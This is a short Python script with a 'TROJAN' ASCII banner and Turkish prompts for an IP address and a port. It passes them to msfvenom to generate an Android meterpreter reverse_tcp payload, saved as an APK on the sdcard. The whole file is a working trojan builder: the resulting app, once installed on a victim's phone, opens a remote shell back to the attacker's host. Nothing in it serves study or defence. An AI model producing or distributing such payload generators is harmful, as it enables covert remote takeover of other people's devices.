import os

os.system("clear")

banner="""
 _______  ______    _______      ___  _______  __    _ 
|       ||    _ |  |       |    |   ||   _   ||  |  | |
|_     _||   | ||  |   _   |    |   ||  |_|  ||   |_| |
  |   |  |   |_||_ |  | |  |    |   ||       ||       |
  |   |  |    __  ||  |_|  | ___|   ||       ||  _    |
  |   |  |   |  | ||       ||       ||   _   || | |   |
  |___|  |___|  |_||_______||_______||__| |__||_|  |__|
"""
print(banner)

ip=input("ip adresini giriniz----->")
port=input("portu giriniz----->")
os.system("clear && msfvenom -p android/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+ " R > /sdcard/app.apk")